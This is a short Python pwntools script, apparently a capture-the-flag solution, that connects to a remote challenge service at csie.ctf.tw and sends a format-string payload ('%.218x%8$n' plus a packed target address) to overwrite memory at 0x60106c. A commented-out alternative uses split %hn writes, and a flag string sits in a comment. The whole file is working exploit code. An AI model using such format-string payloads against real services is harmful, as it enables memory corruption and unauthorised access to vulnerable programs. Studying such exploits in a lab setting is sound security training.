#!/usr/bin/env python2
# -*- coding: ascii -*-
from pwn import *

# FLAG{JUST CRAXME!@_@}

context.arch = 'amd64'

host , port = 'csie.ctf.tw' , 10134

y = remote(host,port)

p = '%.218x%8$n......' + p64(0x60106c)
#p = '%.45068x%10$hn%.19138x%11$hn....' + p64(0x60106c) + p64(0x60106c + 4)

y.sendafter( ':' , p )

y.interactive()

